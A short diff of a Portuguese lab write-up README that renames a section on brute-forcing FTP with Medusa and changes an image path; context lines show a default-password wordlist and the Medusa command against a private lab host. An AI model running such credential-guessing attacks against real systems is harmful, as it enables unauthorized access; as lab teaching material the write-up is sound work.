@@ -124,13 +124,13 @@ echo -e "123456\npassword\nmsfadmin\nadmin" > passwd.txt
 ![Criação das wordlists](imagens/wordlist.png)
 *visualizando os arquivos `users.txt` e `passwd.txt` utilizados no ataque*
 
-### ✔️ Execução do Ataque com Medusa
+### ✔️ Execução do Ataque de força bruta com Medusa
 
 ```bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 ```
 
-![Ataque FTP com Medusa](images/08.ataquemedusalista.png)
+![Ataque FTP](imagens/ftp.png)
 *Medusa testando combinações de usuários e senhas no serviço FTP*
 
 ### ✔️ Resultado
